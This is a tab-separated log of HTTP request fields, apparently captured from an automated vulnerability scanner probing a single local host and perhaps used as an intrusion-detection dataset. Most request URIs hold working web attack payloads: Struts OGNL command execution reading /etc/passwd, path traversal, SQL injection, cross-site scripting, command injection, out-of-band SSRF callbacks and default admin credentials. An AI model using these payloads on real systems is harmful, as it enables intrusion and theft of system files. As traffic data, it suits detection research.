http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
	gzip																close		790	790	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/lucee/admin/imgProcess.cfm?file=/../../../context/25Sm0FexS8pZEQkvCnVBkuEqdkf.cfm		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/lucee/admin/imgProcess.cfm?file=/../../../context/25Sm0FexS8pZEQkvCnVBkuEqdkf.cfm
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web
	gzip																close		400	400	multipart/form-data; boundary=------------------------cd0dc6bdc00b1cf9						192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/wp-admin/admin-ajax.php
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/../../../../../../etc/passwd
	gzip																close		1047	1047	multipart/form-data; boundary=8b1ab266c41afb773af2e064bc526458						192.168.1.104															1	http://192.168.1.104/web/./RestAPI/LogonCustomization		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/./RestAPI/LogonCustomization
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/wp-content/uploads/workreap-temp/25Sm0KD67eWjLShxroH6wiOuYsp.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-content/uploads/workreap-temp/25Sm0KD67eWjLShxroH6wiOuYsp.php
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip																close		22	22	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/lucee/25Sm0FexS8pZEQkvCnVBkuEqdkf.cfm		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/lucee/25Sm0FexS8pZEQkvCnVBkuEqdkf.cfm
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/compliancepolicyelements.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL+--+&searchColumn=elementName&searchOption=contains		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/compliancepolicyelements.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL+--+&searchColumn=elementName&searchOption=contains
	gzip		admin:password						Basic YWRtaW46cGFzc3dvcmQ=								close		141	141	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/boafrm/formSysCmd		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/boafrm/formSysCmd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_dwgraphs&controller=../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/index.php?option=com_dwgraphs&controller=../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/plugins/search/..%5C..%5C..%5Cconf%5Copenfire.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/plugins/search/..%5C..%5C..%5Cconf%5Copenfire.xml
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/magmi/web/info.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/magmi/web/info.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/forget-about-shortcode-buttons/assets/js/fasc-buttons/popup.php?source=1&ver=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/wp-content/plugins/forget-about-shortcode-buttons/assets/js/fasc-buttons/popup.php?source=1&ver=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_zimbcomment&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/index.php?option=com_zimbcomment&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/KeepAlive.jsp?stamp=%3Cscript%3Ealert(document.domain)%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/KeepAlive.jsp?stamp=%3Cscript%3Ealert(document.domain)%3C/script%3E
*/*	gzip	en															close		98	98							192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?action=moove_read_xml		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/wp-admin/admin-ajax.php?action=moove_read_xml
	gzip	en	admin:						Basic YWRtaW46								close		103	103	application/json						192.168.1.104															1	http://192.168.1.104/web/mgmt/shared/authn/login		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36			BIGIPAuthCookie=1234	/web/mgmt/shared/authn/login
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ie50/system/login/SysLoginUser.aspx?Login=Error&Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/ie50/system/login/SysLoginUser.aspx?Login=Error&Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rewe/prod/web/rewe_go_check.php?config=rewe&version=7.5.0%3cscript%3econfirm(25Sm0LVDl1U8ApfDdLmxdCRWt8K)%3c%2fscript%3e&win=2707		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/rewe/prod/web/rewe_go_check.php?config=rewe&version=7.5.0%3cscript%3econfirm(25Sm0LVDl1U8ApfDdLmxdCRWt8K)%3c%2fscript%3e&win=2707
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/sourceafrica/js/window.php?wpbase=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/wp-content/plugins/sourceafrica/js/window.php?wpbase=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
	gzip	en															close		39	39	application/json						192.168.1.104															1	http://192.168.1.104/web/mgmt/tm/util/bash		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/mgmt/tm/util/bash
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/
	gzip																close		399	399	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/checkValid		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/checkValid
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/public/css/25Sm05ZXn2Oyb7PLpF6TAIIUuKx.css		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/public/css/25Sm05ZXn2Oyb7PLpF6TAIIUuKx.css
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/ui/vropspluginui/rest/services/getvcdetails		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/ui/vropspluginui/rest/services/getvcdetails
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_jstore&controller=./../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/index.php?option=com_jstore&controller=./../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/../../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/../../../../../../../../../../../../../etc/passwd
	gzip																close		32	32							192.168.1.104															1	http://192.168.1.104/web/.%0d./.%0d./.%0d./.%0d./bin/sh		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/.%0d./.%0d./.%0d./.%0d./bin/sh
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/te%3Cimg%20src=x%20onerror=alert(42)%3Est		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/te%3Cimg%20src=x%20onerror=alert(42)%3Est
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_preventive&controller==../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/index.php?option=com_preventive&controller==../../../../../../../../../../etc/passwd%00
	gzip																close		216	216	application/x-www-form-urlencoded; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/wp-admin/admin-ajax.php
	gzip																close		227	227	application/json						192.168.1.104															1	http://192.168.1.104/web/api/graphql		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/api/graphql
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_news_portal&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/index.php?option=com_news_portal&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/Images/Remote?imageUrl=http://c8accf99m8v8l7afta3gcekcczoyyyyry.oast.site		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/Images/Remote?imageUrl=http://c8accf99m8v8l7afta3gcekcczoyyyyry.oast.site
	gzip																close		89	89							192.168.1.104															1	http://192.168.1.104/web/cgi-bin/mainfunction.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/cgi-bin/mainfunction.cgi
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/plugins/servlet/oauth/users/icon-uri?consumerUri=http://c8accf99m8v8l7afta3gcekcczayyyyrr.oast.site		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/plugins/servlet/oauth/users/icon-uri?consumerUri=http://c8accf99m8v8l7afta3gcekcczayyyyrr.oast.site
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/Items/RemoteSearch/Image?ImageUrl=http://c8accf99m8v8l7afta3gcekcczayyyyrg.oast.site&ProviderName=TheMovieDB		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/Items/RemoteSearch/Image?ImageUrl=http://c8accf99m8v8l7afta3gcekcczayyyyrg.oast.site&ProviderName=TheMovieDB
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/download/index.php?file=../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/download/index.php?file=../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_beeheard&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/index.php?option=com_beeheard&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php/System/MailConnect/host/c8accf99m8v8l7afta3gcekcczoyyyyrn.oast.site/port/80/secure/		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/index.php/System/MailConnect/host/c8accf99m8v8l7afta3gcekcczoyyyyrn.oast.site/port/80/secure/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/admin-font-editor/css.php?size=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/wp-content/plugins/admin-font-editor/css.php?size=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
